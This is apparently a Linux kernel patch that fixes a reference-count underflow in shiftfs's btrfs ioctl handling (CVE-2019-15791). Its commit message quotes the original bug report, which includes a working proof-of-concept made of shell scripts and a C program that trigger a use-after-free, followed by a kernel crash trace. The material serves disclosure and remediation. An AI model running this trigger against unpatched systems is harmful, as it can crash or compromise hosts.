@@ -1,0 +1,301 @@
+From 601a64857b3d7040ca15c39c929e6b9db3373ec1 Mon Sep 17 00:00:00 2001
+From: Seth Forshee <seth.forshee@canonical.com>
+Date: Fri, 1 Nov 2019 10:41:03 -0500
+Subject: UBUNTU: SAUCE: shiftfs: Fix refcount underflow in btrfs ioctl
+ handling
+
+BugLink: https://bugs.launchpad.net/bugs/1850867
+
+shiftfs_btrfs_ioctl_fd_replace() installs an fd referencing a
+file from the lower filesystem without taking an additional
+reference to that file. After the btrfs ioctl completes this fd
+is closed, which then puts a reference to that file, leading to a
+refcount underflow. Original bug report and test case from Jann
+Horn is below.
+
+Fix this, and at the sametime simplify the management of the fd
+to the lower file for the ioctl. In
+shiftfs_btrfs_ioctl_fd_replace(), take the missing reference to
+the lower file and set FDPUT_FPUT so that this reference will get
+dropped on fdput() in error paths. Do not maintain the struct fd
+in the caller, as it the fd installed in the fd table is
+sufficient to properly clean up. Finally, remove the fdput() in
+shiftfs_btrfs_ioctl_fd_restore() as it is redundant with the
+__close_fd() call.
+
+Original report from Jann Horn:
+
+In shiftfs_btrfs_ioctl_fd_replace() ("//" comments added by me):
+
+ src = fdget(oldfd);
+ if (!src.file)
+  return -EINVAL;
+ // src holds one reference (assuming multithreaded execution)
+
+ ret = shiftfs_real_fdget(src.file, lfd);
+ // lfd->file is a file* now, but shiftfs_real_fdget didn't take any
+ // extra references
+ fdput(src);
+ // this drops the only reference we were holding on src, and src was
+ // the only thing holding a reference to lfd->file. lfd->file may be
+ // dangling at this point.
+ if (ret)
+  return ret;
+
+ *newfd = get_unused_fd_flags(lfd->file->f_flags);
+ if (*newfd < 0) {
+  // always a no-op
+  fdput(*lfd);
+  return *newfd;
+ }
+
+ fd_install(*newfd, lfd->file);
+ // fd_install() consumes a counted reference, but we don't hold any
+ // counted references. so at this point, if lfd->file hasn't been freed
+ // yet, its refcount is one lower than it ought to be.
+
+ [...]
+
+ // the following code is refcount-neutral, so the refcount stays one too
+ // low.
+ if (ret)
+  shiftfs_btrfs_ioctl_fd_restore(cmd, *lfd, *newfd, arg, v1, v2);
+
+shiftfs_real_fdget() is implemented as follows:
+
+static int shiftfs_real_fdget(const struct file *file, struct fd *lowerfd)
+{
+ struct shiftfs_file_info *file_info = file->private_data;
+ struct file *realfile = file_info->realfile;
+
+ lowerfd->flags = 0;
+ lowerfd->file = realfile;
+
+ /* Did the flags change since open? */
+ if (unlikely(file->f_flags & ~lowerfd->file->f_flags))
+  return shiftfs_change_flags(lowerfd->file, file->f_flags);
+
+ return 0;
+}
+
+Therefore, the following PoC will cause reference count overdecrements; I ran it
+with SLUB debugging enabled and got the following splat:
+
+=======================================
+user@ubuntu1910vm:~/shiftfs$ cat run.sh
+sync
+unshare -mUr ./run2.sh
+t run2user@ubuntu1910vm:~/shiftfs$ cat run2.sh
+set -e
+
+mkdir -p mnt/tmpfs
+mkdir -p mnt/shiftfs
+mount -t tmpfs none mnt/tmpfs
+mount -t shiftfs -o mark,passthrough=2 mnt/tmpfs mnt/shiftfs
+mount|grep shift
+touch mnt/tmpfs/foo
+gcc -o ioctl ioctl.c -Wall
+./ioctl
+user@ubuntu1910vm:~/shiftfs$ cat ioctl.c
+
+int main(void) {
+  int root = open("mnt/shiftfs", O_RDONLY);
+  if (root == -1) err(1, "open shiftfs root");
+  int foofd = openat(root, "foo", O_RDONLY);
+  if (foofd == -1) err(1, "open foofd");
+  struct btrfs_ioctl_vol_args iocarg = {
+    .fd = foofd
+  };
+  ioctl(root, BTRFS_IOC_SNAP_CREATE, &iocarg);
+  sleep(1);
+  void *map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, foofd, 0);
+  if (map != MAP_FAILED) munmap(map, 0x1000);
+}
+user@ubuntu1910vm:~/shiftfs$ ./run.sh
+none on /home/user/shiftfs/mnt/tmpfs type tmpfs (rw,relatime,uid=1000,gid=1000)
+/home/user/shiftfs/mnt/tmpfs on /home/user/shiftfs/mnt/shiftfs type shiftfs (rw,relatime,mark,passthrough=2)
+[ 183.463452] general protection fault: 0000 [#1] SMP PTI
+[ 183.467068] CPU: 1 PID: 2473 Comm: ioctl Not tainted 5.3.0-19-generic #20-Ubuntu
+[ 183.472170] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.12.0-1 04/01/2014
+[ 183.476830] RIP: 0010:shiftfs_mmap+0x20/0xd0 [shiftfs]
+[ 183.478524] Code: 20 cf 5d c3 c3 0f 1f 44 00 00 0f 1f 44 00 00 55 48 89 e5 41 57 41 56 41 55 41 54 48 8b 87 c8 00 00 00 4c 8b 68 10 49 8b 45 28 <48> 83 78 60 00 0f 84 97 00 00 00 49 89 fc 49 89 f6 48 39 be a0 00
+[ 183.484585] RSP: 0018:ffffae48007c3d40 EFLAGS: 00010206
+[ 183.486290] RAX: 6b6b6b6b6b6b6b6b RBX: ffff93f1fb7908a8 RCX: 7800000000000000
+[ 183.489617] RDX: 8000000000000025 RSI: ffff93f1fb792208 RDI: ffff93f1f69fa400
+[ 183.491975] RBP: ffffae48007c3d60 R08: ffff93f1fb792208 R09: 0000000000000000
+[ 183.494311] R10: ffff93f1fb790888 R11: 00007f1d01d10000 R12: ffff93f1fb7908b0
+[ 183.496675] R13: ffff93f1f69f9900 R14: ffff93f1fb792208 R15: ffff93f22f102e40
+[ 183.499011] FS: 00007f1d01cd1540(0000) GS:ffff93f237a40000(0000) knlGS:0000000000000000
+[ 183.501679] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[ 183.503568] CR2: 00007f1d01bc4c10 CR3: 0000000242726001 CR4: 0000000000360ee0
+[ 183.505901] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[ 183.508229] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[ 183.510580] Call Trace:
+[ 183.511396] mmap_region+0x417/0x670
+[ 183.512592] do_mmap+0x3a8/0x580
+[ 183.513655] vm_mmap_pgoff+0xcb/0x120
+[ 183.514863] ksys_mmap_pgoff+0x1ca/0x2a0
+[ 183.516155] __x64_sys_mmap+0x33/0x40
+[ 183.517352] do_syscall_64+0x5a/0x130
+[ 183.518548] entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[ 183.520196] RIP: 0033:0x7f1d01bfaaf6
+[ 183.521372] Code: 00 00 00 00 f3 0f 1e fa 41 f7 c1 ff 0f 00 00 75 2b 55 48 89 fd 53 89 cb 48 85 ff 74 37 41 89 da 48 89 ef b8 09 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 62 5b 5d c3 0f 1f 80 00 00 00 00 48 8b 05 61
+[ 183.527210] RSP: 002b:00007ffdf50bae98 EFLAGS: 00000246 ORIG_RAX: 0000000000000009
+[ 183.529582] RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 00007f1d01bfaaf6
+[ 183.531811] RDX: 0000000000000001 RSI: 0000000000001000 RDI: 0000000000000000
+[ 183.533999] RBP: 0000000000000000 R08: 0000000000000004 R09: 0000000000000000
+[ 183.536199] R10: 0000000000000001 R11: 0000000000000246 R12: 00005616cf6f5140
+[ 183.538448] R13: 00007ffdf50bbfb0 R14: 0000000000000000 R15: 0000000000000000
+[ 183.540714] Modules linked in: shiftfs intel_rapl_msr intel_rapl_common kvm_intel kvm irqbypass snd_hda_codec_generic ledtrig_audio snd_hda_intel snd_hda_codec snd_hda_core crct10dif_pclmul snd_hwdep crc32_pclmul ghash_clmulni_intel snd_pcm aesni_intel snd_seq_midi snd_seq_midi_event aes_x86_64 crypto_simd snd_rawmidi cryptd joydev input_leds snd_seq glue_helper qxl snd_seq_device snd_timer ttm drm_kms_helper drm snd fb_sys_fops syscopyarea sysfillrect sysimgblt serio_raw qemu_fw_cfg soundcore mac_hid sch_fq_codel parport_pc ppdev lp parport virtio_rng ip_tables x_tables autofs4 hid_generic usbhid hid virtio_net net_failover psmouse ahci i2c_i801 libahci lpc_ich virtio_blk failover
+[ 183.560350] ---[ end trace 4a860910803657c2 ]---
+[ 183.561832] RIP: 0010:shiftfs_mmap+0x20/0xd0 [shiftfs]
+[ 183.563496] Code: 20 cf 5d c3 c3 0f 1f 44 00 00 0f 1f 44 00 00 55 48 89 e5 41 57 41 56 41 55 41 54 48 8b 87 c8 00 00 00 4c 8b 68 10 49 8b 45 28 <48> 83 78 60 00 0f 84 97 00 00 00 49 89 fc 49 89 f6 48 39 be a0 00
+[ 183.569438] RSP: 0018:ffffae48007c3d40 EFLAGS: 00010206
+[ 183.571102] RAX: 6b6b6b6b6b6b6b6b RBX: ffff93f1fb7908a8 RCX: 7800000000000000
+[ 183.573362] RDX: 8000000000000025 RSI: ffff93f1fb792208 RDI: ffff93f1f69fa400
+[ 183.575655] RBP: ffffae48007c3d60 R08: ffff93f1fb792208 R09: 0000000000000000
+[ 183.577893] R10: ffff93f1fb790888 R11: 00007f1d01d10000 R12: ffff93f1fb7908b0
+[ 183.580166] R13: ffff93f1f69f9900 R14: ffff93f1fb792208 R15: ffff93f22f102e40
+[ 183.582411] FS: 00007f1d01cd1540(0000) GS:ffff93f237a40000(0000) knlGS:0000000000000000
+[ 183.584960] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[ 183.586796] CR2: 00007f1d01bc4c10 CR3: 0000000242726001 CR4: 0000000000360ee0
+[ 183.589035] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[ 183.591279] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+=======================================
+
+Disassembly of surrounding code:
+
+55 push rbp
+4889E5 mov rbp,rsp
+4157 push r15
+4156 push r14
+4155 push r13
+4154 push r12
+488B87C8000000 mov rax,[rdi+0xc8]
+4C8B6810 mov r13,[rax+0x10]
+498B4528 mov rax,[r13+0x28]
+4883786000 cmp qword [rax+0x60],byte +0x0 <-- GPF HERE
+0F8497000000 jz near 0xcc
+4989FC mov r12,rdi
+4989F6 mov r14,rsi
+
+This is an attempted dereference of 0x6b6b6b6b6b6b6b6b, which is POISON_FREE; I
+think this corresponds to the load of "realfile->f_op->mmap" in the source code.
+
+Reported-by: Jann Horn <jannh@google.com>
+Signed-off-by: Seth Forshee <seth.forshee@canonical.com>
+
+CVE-2019-15791
+
+Acked-by: Tyler Hicks <tyhicks@canonical.com>
+Signed-off-by: Stefan Bader <stefan.bader@canonical.com>
+---
+ fs/shiftfs.c | 35 +++++++++++++++++++++--------------
+ 1 file changed, 21 insertions(+), 14 deletions(-)
+
+diff --git a/fs/shiftfs.c b/fs/shiftfs.c
+index 55bb32b..60576e9 100644
+--- a/fs/shiftfs.c
++++ b/fs/shiftfs.c
+@@ -1382,8 +1382,7 @@ static inline bool is_btrfs_snap_ioctl(int cmd)
+ 	return false;
+ }
+ 
+-static int shiftfs_btrfs_ioctl_fd_restore(int cmd, struct fd lfd, int fd,
+-					  void __user *arg,
++static int shiftfs_btrfs_ioctl_fd_restore(int cmd, int fd, void __user *arg,
+ 					  struct btrfs_ioctl_vol_args *v1,
+ 					  struct btrfs_ioctl_vol_args_v2 *v2)
+ {
+@@ -1397,7 +1396,6 @@ static int shiftfs_btrfs_ioctl_fd_restore(int cmd, struct fd lfd, int fd,
+ 	else
+ 		ret = copy_to_user(arg, v2, sizeof(*v2));
+ 
+-	fdput(lfd);
+ 	__close_fd(current->files, fd);
+ 	kfree(v1);
+ 	kfree(v2);
+@@ -1408,11 +1406,11 @@ static int shiftfs_btrfs_ioctl_fd_restore(int cmd, struct fd lfd, int fd,
+ static int shiftfs_btrfs_ioctl_fd_replace(int cmd, void __user *arg,
+ 					  struct btrfs_ioctl_vol_args **b1,
+ 					  struct btrfs_ioctl_vol_args_v2 **b2,
+-					  struct fd *lfd,
+ 					  int *newfd)
+ {
+ 	int oldfd, ret;
+ 	struct fd src;
++	struct fd lfd = {};
+ 	struct btrfs_ioctl_vol_args *v1 = NULL;
+ 	struct btrfs_ioctl_vol_args_v2 *v2 = NULL;
+ 
+@@ -1437,18 +1435,28 @@ static int shiftfs_btrfs_ioctl_fd_replace(int cmd, void __user *arg,
+ 	if (!src.file)
+ 		return -EINVAL;
+ 
+-	ret = shiftfs_real_fdget(src.file, lfd);
+-	fdput(src);
+-	if (ret)
++	ret = shiftfs_real_fdget(src.file, &lfd);
++	if (ret) {
++		fdput(src);
+ 		return ret;
++	}
++
++	/*
++	 * shiftfs_real_fdget() does not take a reference to lfd.file, so
++	 * take a reference here to offset the one which will be put by
++	 * __close_fd(), and make sure that reference is put on fdput(lfd).
++	 */
++	get_file(lfd.file);
++	lfd.flags |= FDPUT_FPUT;
++	fdput(src);
+ 
+-	*newfd = get_unused_fd_flags(lfd->file->f_flags);
++	*newfd = get_unused_fd_flags(lfd.file->f_flags);
+ 	if (*newfd < 0) {
+-		fdput(*lfd);
++		fdput(lfd);
+ 		return *newfd;
+ 	}
+ 
+-	fd_install(*newfd, lfd->file);
++	fd_install(*newfd, lfd.file);
+ 
+ 	if (cmd == BTRFS_IOC_SNAP_CREATE) {
+ 		v1->fd = *newfd;
+@@ -1461,7 +1469,7 @@ static int shiftfs_btrfs_ioctl_fd_replace(int cmd, void __user *arg,
+ 	}
+ 
+ 	if (ret)
+-		shiftfs_btrfs_ioctl_fd_restore(cmd, *lfd, *newfd, arg, v1, v2);
++		shiftfs_btrfs_ioctl_fd_restore(cmd, *newfd, arg, v1, v2);
+ 
+ 	return ret;
+ }
+@@ -1475,13 +1483,12 @@ static long shiftfs_real_ioctl(struct file *file, unsigned int cmd,
+ 	int newfd = -EBADF;
+ 	long err = 0, ret = 0;
+ 	void __user *argp = (void __user *)arg;
+-	struct fd btrfs_lfd = {};
+ 	struct super_block *sb = file->f_path.dentry->d_sb;
+ 	struct btrfs_ioctl_vol_args *btrfs_v1 = NULL;
+ 	struct btrfs_ioctl_vol_args_v2 *btrfs_v2 = NULL;
+ 
+ 	ret = shiftfs_btrfs_ioctl_fd_replace(cmd, argp, &btrfs_v1, &btrfs_v2,
+-					     &btrfs_lfd, &newfd);
++					     &newfd);
+ 	if (ret < 0)
+ 		return ret;
+ 
+@@ -1504,7 +1511,7 @@ out_fdput:
+ 	fdput(lowerfd);
+ 
+ out_restore:
+-	err = shiftfs_btrfs_ioctl_fd_restore(cmd, btrfs_lfd, newfd, argp,
++	err = shiftfs_btrfs_ioctl_fd_restore(cmd, newfd, argp,
+ 					     btrfs_v1, btrfs_v2);
+ 	if (!ret)
+ 		ret = err;
+-- 
+cgit v1.1
+
